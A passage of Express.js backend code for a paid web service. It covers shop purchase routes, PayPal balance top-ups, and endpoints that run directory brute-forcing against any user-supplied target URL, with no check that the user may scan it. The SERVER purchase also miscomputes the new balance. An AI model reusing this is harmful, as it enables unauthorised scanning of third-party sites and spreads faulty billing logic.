				});
			})(); 
		}
		else
		{
			return res.send({
				success: false,
				message: 'Invalid User.'
			});	
		}
	});
});
app.get('/app/api/shop/confirmitem', async (req, res, next) => {
	const { query } = req;
	const {
		token,
		itemid
	} = query;
	if(!token)
	{
		return res.send({
			success: false,
			message: 'Token inavailable.'
		});
	}
	if(!itemid)
	{
		return res.send({
			success: false,
			message: 'Item ID inavailable.'
		});
	}
	await UserSessionSchema.find({
		userToken : token,
		isDeleted : false
	}, async (err, hahatokens) => {
		if(err)
		{
			return res.send({
				success: false,
				message: 'Server Error, please try again later.'
			});
		}
		const yadatokens = hahatokens[0];
		if(hahatokens.length != 1)
		{
			return res.send({
				success: false,
				message: 'Invalid Token.'
			});
		}
		const reqyo = await UserSchema.findOne({ userID : yadatokens.userID });
		if(reqyo)
		{
			( async () => {
				const ShopITEM = await ShopSchema.findOne({ 
					ItemID : itemid,
					ItemStock : true
				})
				if(ShopITEM)
				{
					return res.send({
						success: true,
						message: 'Information has been successfuly retrieved',
						ItemName: ShopITEM.ItemName,
						ItemDescription: ShopITEM.ItemDescription,
						ItemPrice: ShopITEM.ItemPrice,
						ItemType: ShopITEM.ItemType
					});	
				}
				else
				{
					return res.send({
						success: false,
						message: 'Invalid Item.'
					});	
				}
			})(); 
		}
		else
		{
			return res.send({
				success: false,
				message: 'Invalid User.'
			});	
		}
	});
})
app.post('/app/api/shop/buyitem', async (req, res, next) => {
	const { body } = req;
	const {
		token,
		ShopID
	} = body;
	if(!token)
	{
		return res.send({
			success : false,
			message : 'Token Inavailable'
		})
	}
	if(!ShopID)
	{
		return res.send({
			success : false,
			message : 'Item ID Inavailable'
		})
	}
	const TokenUser = await UserSessionSchema.findOne({
		userToken : token,
		isDeleted : false
	})
	if(TokenUser)
	{
		const UserPlayer = await UserSchema.findOne({
			userID : TokenUser.userID
		})
		if(UserPlayer)
		{
			const ShopPlayer = await ShopSchema.findOne({
				ItemID : ShopID,
				ItemStock : true
			})
			if(ShopPlayer)
			{
				if(UserPlayer.MoneyBal < ShopPlayer.ItemPrice)
				{
					return res.send({
						success : false,
						message : 'Insufficient Balance'
					})
				}
				let ShopArray = ShopPlayer.ItemArray;
				switch(ShopPlayer.ItemType)
				{
					case 'SERVER' : 
					{
						let UserServers = UserPlayer.AssignedServer;
						var ThePromise = new Promise((resolve, reject) => {
							ShopArray.forEach( (server, index, array) => {
								UserServers.push({
									ID : server.ID,
									EXP : server.EXP
								})
								if (index === array.length -1) resolve();
							})
						});
						ThePromise.then( async () => {
							let NewPrice = ShopPlayer.ItemPrice - UserPlayer.MoneyBal
							let NewShopLogs = UserPlayer.ShopLogs
							NewShopLogs.push({
								ID : ShopPlayer.ItemID,
								Title : ShopPlayer.ItemName,
								Balance : UserPlayer.MoneyBal,
								Price : ShopPlayer.ItemPrice,
								Date : Date()
							})
							await UserSchema.findOneAndUpdate({
								userID : TokenUser.userID
							}, {
								$set:
								{
									AssignedServer : UserServers,
									MoneyBal : NewPrice,
									ShopLogs : NewShopLogs
								}
							}, {
								new : true
							}, async (err, yada) => {
								if(err)
								{
									return res.send({
										success: false,
										message: 'Server Error, please try again later.'
									});
								}
								await ShopSchema.findOneAndUpdate({
									ItemID : ShopPlayer.ItemID
								}, {
									$set:
									{
										ItemStock : false
									}
								}, {
									new : true
								}, (err, yeahresults) => {
									if(err)
									{
										return res.send({
											success: false,
											message: 'Server Error, please try again later.'
										});
									}
									return res.send({
										success: true,
										message: 'Payment has been successfuly made.'
									});
								})
							})
						}).catch( (err) => {
							return res.send({
								success : false,
								message : 'A server error has occured, please try again later'
							})
						})
						break;
					}
					case 'METHOD' : 
					{
						let UserMethods = UserPlayer.AssignedMethods;
						var ThePromise = new Promise((resolve, reject) => {
							ShopArray.forEach( (method, index, array) => {
								UserMethods.push(method.ID)
								if (index === array.length -1) resolve();
							})
						});
						ThePromise.then( async () => {
							let NewPrice = UserPlayer.MoneyBal - ShopPlayer.ItemPrice;
							let NewShopLogs = UserPlayer.ShopLogs
							NewShopLogs.push({
								ID : ShopPlayer.ItemID,
								Title : ShopPlayer.ItemName,
								Balance : UserPlayer.MoneyBal,
								Price : ShopPlayer.ItemPrice,
								Date : Date()
							})
							await UserSchema.findOneAndUpdate({
								userID : TokenUser.userID
							}, {
								$set:
								{
									AssignedMethods : UserMethods,
									MoneyBal : NewPrice,
									ShopLogs : NewShopLogs
								}
							}, {
								new : true
							}, (err, yada) => {
								if(err)
								{
									return res.send({
										success: false,
										message: 'Server Error, please try again later.'
									});
								}
								return res.send({
									success: true,
									message: 'Payment has been successfuly made.'
								});
							})
						}).catch( (err) => {
							return res.send({
								success : false,
								message : 'A server error has occured, please try again later'
							})
						})
						break;
					}
					case 'VIP' : 
					{
						// Soon?
						break;
					}
					default :
					{
						return res.send({
							success : false,
							message : 'A server error has occured, please check back later'
						})	
					}
				}
			}
			else
			{
				return res.send({
					success : false,
					message : 'Invalid Item'
				})	
			}
		}
		else
		{
			return res.send({
				success : false,
				message : 'Invalid User'
			})
		}
	}
	else
	{
		return res.send({
			success : false,
			message : 'Invalid Token'
		})
	}
})

app.post('/paypal/confirm/payment', (req, res, next) => {
	const { body } = req;
	const {
		token,
		payerID,
		paymentID
	} = body;
	if(!token)
	{
		return res.send({
			success : false,
			message : 'Token inavailable'
		})
	}
	if(!payerID)
	{
		return res.send({
			success : false,
			message : 'PayerID inavailable'
		})
	}
	if(!paymentID)
	{
		return res.send({
			success : false,
			message : 'PaymentID inavailable'
		})
	}
	var execute_payment_json = {
		    "payer_id": payerID,
		    "transactions": [{
		        "amount": {
		            "currency": "USD",
		            "total": "5.00"
		        }
	    }]
	};
	paypal.payment.execute(paymentID, execute_payment_json, function (error, payment) {
    if (error) {
		return res.send({
			success : false,
			message : 'Server error has occured, please try again later.'
		})
    } else {
    	UserSessionSchema.findOne({
    		userToken : token
    	}).then( (doc) => {
    		UserSchema.findOne({
    			userID : doc.userID
    		}).then( (doc2) => {
    			//console.log(JSON.stringify(payment));
    			//console.log(payment.transactions.amount)
    			//console.log(payment.transactions)
    			const transactions = payment.transactions
    			//let amount = transactions.amount
    			//console.log(transactions[0].amount.total)
    			const CurrentBalance = (doc2.MoneyBal + (transactions[0].amount.total / 1.05)).toFixed(2);
    			//console.log(CurrentBalance)
    			UserSchema.findOneAndUpdate({
					userID : doc.userID
				}, {
					$set:
					{
						MoneyBal : CurrentBalance,
					}
				}, {
					new : true
				}, (err, yada) => {
					if(err)
					{
				    	return res.send({
							success : false,
							message : 'A server error has occured, please notify the staff ASAP.'
						})
					}
			    	return res.send({
						success : true,
						message : 'Payment has successfuly went through, refresh the page to see your balance.'
					})
				})

    		}).catch(err => {
				return res.send({
					success : false,
					message : 'A server error has occured, please notify the staff ASAP.'
				})
	    	})
    	}).catch(err => {
			return res.send({
				success : false,
				message : 'A server error has occured, please notify the staff ASAP.'
			})
    	})
    }
});
})
app.get('/app/api/dirbuster', (req, res, next) => {
	const { query } = req;
	const {
		token,
		wordlist, 
		url,
		time
	} = query;
	if(!token)
	{
		return res.send({
			success : false,
			message : 'Token inavailable'
		})
	}
	if(!wordlist)
	{
		return res.send({
			success : false,
			message : 'A Wordlist key is required'
		})
	}
	if(!url)
	{
		return res.send({
			success : false,
			message : 'A Target URL is required'
		})
	}
	if(!time)
	{
		return res.send({
			success : false,
			message : 'A Time Limit is required'
		})
	}
	UserSessionSchema.findOne({
    		userToken : token
	}).then( (doc) => {
		UserSchema.findOne({
			userID : doc.userID
		}).then( (doc2) => {
			try {
				CheckOnGoing(doc.userID).then( (THeBoolean) => {
					if(!THeBoolean)
					{
						return res.send({
							success : false,
							message : 'You have an OnGoing Dirbuster operation, wait for it to finish then try again'
						})
					}
					let PTSD_ID = randomstring.generate({
						length: 64,
						charset: 'ABCDEFGHIJKLMNOPQSTUVWXYZabcdefghijklmnopqstuvwxyz0123456789'
					});
					DirectoryBuster(url, wordlist, PTSD_ID, time).then( (results) => {
						let NewAssignedDirbusters = []
						NewAssignedDirbusters = doc2.AssignedDirbusters
						NewAssignedDirbusters.push(PTSD_ID)
						UserSchema.findOneAndUpdate({
							userID : doc.userID
						}, {
							$set:
							{
								AssignedDirbusters : NewAssignedDirbusters,
							}
						}, {
							new : true
						}, (err, yada) => {
							if(err)
							{
						    	return res.send({
									success : false,
									message : 'A server error has occured, please notify the staff ASAP.'
								})
							}
					    	return res.send({
								success : true,
								message : 'Dirbuster has successfuly finished the operation.'
							})
						})
					})
				})
			} catch ( err ) 
			{
				return res.send({
					success : false,
					message : 'An Error has occured with Dirbuster, please try again.'
				})
			}
		})
	});
})
app.get('/app/api/dirbusted', (req, res, next) => {
	const { query } = req;
	const {
		token
	} = query;
	if(!token)
	{
		return res.send({
			success : false,
			message : 'Token inavailable'
		})
	}
	UserSessionSchema.findOne({
    		userToken : token
	}).then( (doc) => {
		UserSchema.findOne({
			userID : doc.userID
		}).then( (doc2) => {
			( async () => {
				let DirbustedArray = []
				const promises = doc2.AssignedDirbusters.map( async (ID) => 
				{
					const FoundDirbusted = await DirectorySchema.findOne( { ID : ID } );
					if(FoundDirbusted)
					{
						DirbustedArray.push({
							Target : FoundDirbusted.Target,
							ID : FoundDirbusted.ID,
							Date : FoundDirbusted.Date,
							Status : FoundDirbusted.Status
						});
					}
				})
				await Promise.all(promises)
				.then( () => {
					return res.send({
						success: true,
						message: 'Dirbusted Information Acquired',
						DirbustedArray: DirbustedArray
					});	
				})
				.catch( (err) => {
					return res.send({
						success: false,
						message: 'Server Error, please try again later.'
					});
				});
			})();
		})
	});
})
app.get('/app/api/dirbusting', (req, res, next) => {
	const { query } = req;
	const {
		token,
		id
	} = query;
	if(!token)
	{
		return res.send({
			success : false,
			message : 'Token inavailable'
		})
	}
	if(!id)
	{
		return res.send({
			success : false,
			message : 'ID inavailable'
		})
	}
	UserSessionSchema.findOne({
    		userToken : token
	}).then( (doc) => {
		UserSchema.findOne({
			userID : doc.userID
		}).then( (doc2) => {
			if(!(doc2.AssignedDirbusters.includes(id)))
			{
				return res.send({
					success : false,
					message : 'A server error has occurred, please try again later.'
				})
			}
			DirectorySchema.findOne( { ID : id } ).then( (results) => {
				return res.send({
						success: true,
						message: 'Dirbusting Information Acquired',
						result: results.Results
				});	
			})
		})
	});
})